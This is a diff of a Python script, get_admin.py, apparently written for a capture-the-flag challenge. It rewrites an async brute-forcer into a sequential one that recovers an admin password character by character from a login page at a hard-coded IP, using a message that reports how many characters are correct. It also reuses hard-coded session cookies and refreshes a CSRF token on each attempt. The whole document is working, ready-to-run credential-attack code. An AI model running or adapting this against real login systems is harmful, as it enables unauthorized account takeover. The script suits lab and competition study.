@@ -1,109 +1,136 @@
 # get_admin.py
-import asyncio, re, string, aiohttp
-from aiohttp import ClientTimeout, ClientConnectionError, ServerDisconnectedError
+import re
+import time
+import string
+import requests
+from urllib.parse import urljoin
 
-BASE = "http://52.59.124.14:5015"   # ←環境に合わせて
-LOGIN_PATH = "/login.php"        # ←あなたの環境はこれでOKとのこと
+BASE = "http://52.59.124.14:5015"
+LOGIN_PATH = "/login.php"
 USERNAME = "admin"
 
-# 文字集合は必要に応じて追加
+# ★指定の Cookie（期限切れなら差し替えてください）
+FIXED_COOKIES = {
+    "PHPSESSID": "7b598ad71b99eb80708d4cdec7c2437f",
+    "webpy_session_id": "2f8752c17fb5b63ae949a6e94e3f13b7756d3cd6",
+}
+
+# 現実的な文字集合（必要に応じて追加）
 ALPH = (
-        string.ascii_lowercase + string.digits +
-        string.ascii_uppercase + "_{}!@#$%^&*()-+=.:;?, "
-                                 "'\"`~[]\\|/<>"
+        string.ascii_lowercase +
+        string.digits +
+        string.ascii_uppercase +
+        "_{}!@#$%^&*()-+=.:;?,/"
 )
 
-# ★ このサイトのメッセージにドンピシャの正規表現
-RX_HIT = re.compile(r"Invalid password,\s*but you got\s+(\d+)\s+characters\s+correct!?",
-                    re.I)
+RX_HINT = re.compile(
+    r"Invalid password,\s*but you got\s+(\d+)\s+characters\s+correct!?",
+    re.I,
+)
 
-CONC_LIMIT = 12                                  # サーバに優しく
-TIMEOUT = ClientTimeout(total=12, connect=5, sock_read=7)
-RETRIES = 3
-
-async def fetch_csrf(session):
-    # CSRF が無ければ None のままでOK
-    async with session.get(f"{BASE}{LOGIN_PATH}", allow_redirects=True, timeout=TIMEOUT) as r:
-        html = await r.text()
-    m = re.search(r'name="csrf"\s+value="([^"]+)"', html, re.I)
-    return m.group(1) if m else None
+HEADERS = {
+    "User-Agent": "ctf-bf/requests",
+    "Accept-Encoding": "identity",
+    "Referer": urljoin(BASE, "/index.php"),
+}
+TIMEOUT = 8
+DELAY_BETWEEN_REQUESTS = 0.03  # 優しめに
 
 def parse_count(html: str) -> int | None:
-    m = RX_HIT.search(html)
+    m = RX_HINT.search(html)
     return int(m.group(1)) if m else None
 
-async def post_with_retry(session, pwd, csrf=None):
-    data = {"username": USERNAME, "password": pwd}
-    if csrf is not None:
+def fetch_csrf(sess: requests.Session) -> str | None:
+    """hidden CSRF があれば取得（無ければ None のままでOK）"""
+    r = sess.get(urljoin(BASE, LOGIN_PATH), timeout=TIMEOUT, headers=HEADERS, allow_redirects=True)
+    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text, re.I)
+    return m.group(1) if m else None
+
+def post_and_grab(sess: requests.Session, password: str, csrf: str | None):
+    """フォーム送信 → 最終HTMLでヒント抽出。なければいくつかのURLを追加GETして拾う。"""
+    data = {"username": USERNAME, "password": password}
+    if csrf:
         data["csrf"] = csrf
-    last_exc = None
-    for i in range(RETRIES):
-        try:
-            async with session.post(
-                    f"{BASE}{LOGIN_PATH}",
-                    data=data,
-                    allow_redirects=True,
-                    timeout=TIMEOUT,
-                    headers={"Referer": f"{BASE}{LOGIN_PATH}", "Accept-Encoding": "identity"},
-            ) as r:
-                text = await r.text()
-                # 成功の合図（必要なら増やす）
-                if ("Dashboard" in text) or ("Logout" in text) or ("Welcome" in text):
-                    return True, None
-                print(text)
-                return False, parse_count(text)
-        except (asyncio.TimeoutError, ClientConnectionError, ServerDisconnectedError) as e:
-            last_exc = e
-            await asyncio.sleep(0.2 * (2 ** i))
-    raise last_exc
 
-async def try_round(session, prefix, bucket, csrf):
-    sem = asyncio.Semaphore(CONC_LIMIT)
-    tasks = []
+    # 1) POST（requests は既定でリダイレクト追従）
+    r = sess.post(urljoin(BASE, LOGIN_PATH), data=data, timeout=TIMEOUT, headers=HEADERS)
+    html = r.text
 
-    async def worker(ch):
-        async with sem:
-            ok, cnt = await post_with_retry(session, prefix + ch, csrf=csrf)
-            print(cnt)
-        return ch, ok, cnt
+    # 成功判定（必要なら語を追加）
+    if any(k in html for k in ("Dashboard", "Logout", "Welcome")):
+        return True, None
 
-    for ch in bucket:
-        tasks.append(asyncio.create_task(worker(ch)))
+    cnt = parse_count(html)
+    if cnt is not None:
+        return False, cnt
 
-    winner = None
-    try:
-        for fut in asyncio.as_completed(tasks):
-            ch, ok, cnt = await fut
+    # 2) 追加 GET（Flash が “次の GET” で出るサイトへの保険）
+    follow = [str(r.url), "/", "/index.php", LOGIN_PATH]
+    seen = set()
+    for path in follow:
+        url = path if path.startswith("http") else urljoin(BASE, path)
+        if url in seen:
+            continue
+        seen.add(url)
+        g = sess.get(url, timeout=TIMEOUT, headers=HEADERS, allow_redirects=True)
+        ghtml = g.text
+        if any(k in ghtml for k in ("Dashboard", "Logout", "Welcome")):
+            return True, None
+        gcnt = parse_count(ghtml)
+        if gcnt is not None:
+            return False, gcnt
+
+    # 見つからなかった
+    return False, None
+
+def try_one(sess: requests.Session, pwd: str) -> tuple[bool, int | None]:
+    # CSRF がワンショット型でも安全なように毎回取得（不要なら None のまま）
+    csrf = fetch_csrf(sess)
+    ok, cnt = post_and_grab(sess, pwd, csrf)
+    return ok, cnt
+
+def main():
+    s = requests.Session()
+    s.headers.update(HEADERS)
+    # 固定クッキー付与（必要なら UA/Referer も合わせてください）
+    for k, v in FIXED_COOKIES.items():
+        s.cookies.set(k, v, domain="52.59.124.14", path="/")
+
+    prefix = ""
+    while True:
+        target_len = len(prefix) + 1
+        hit_char = None
+
+        for ch in ALPH:
+            test = prefix + ch
+            try:
+                ok, cnt = try_one(s, test)
+            except requests.RequestException as e:
+                # 一時エラーは軽く待ってリトライ気味に続行
+                print(f"[warn] {e}; retrying next...")
+                time.sleep(0.2)
+                continue
+
             if ok:
-                return prefix + ch, True
-            if cnt == len(prefix) + 1:
-                winner = ch
+                print(f"PASSWORD = {test}")
+                return
+
+            print(f"[{test}] N={cnt if cnt is not None else '-'}")
+            if cnt == target_len:
+                hit_char = ch
+                print(f"hit: {test}  (N={cnt})")
                 break
-    finally:
-        for t in tasks:
-            if not t.done():
-                t.cancel()
 
-    if winner:
-        return prefix + winner, False
-    return None, False
+            time.sleep(DELAY_BETWEEN_REQUESTS)
 
-async def find_password():
-    connector = aiohttp.TCPConnector(limit_per_host=CONC_LIMIT, ssl=False, force_close=False)
-    async with aiohttp.ClientSession(connector=connector,
-                                     headers={"Connection": "keep-alive",
-                                              "User-Agent": "ctf-bf/1.2"}) as session:
-        prefix = ""
-        while True:
-            csrf = await fetch_csrf(session)  # CSRFが単発型でも毎ラウンド更新で安全
-            nxt, done = await try_round(session, prefix, ALPH, csrf)
-            if nxt is None:
-                raise RuntimeError("stalled: メッセージ/CSRF/ユーザー名/エンドポイントを再確認してください。")
-            prefix = nxt
-            print("→", prefix)
-            if done:
-                return prefix
+        if not hit_char:
+            raise SystemExit(
+                f"stalled at prefix='{prefix}'. "
+                f"Cookie/文言/エンドポイント/ユーザー名を確認してください。"
+            )
+
+        prefix += hit_char
+        print(f"→ {prefix}")
 
 if __name__ == "__main__":
-    pw = asyncio.run(find_password())
-    print("PASSWORD =", pw)
+    main()
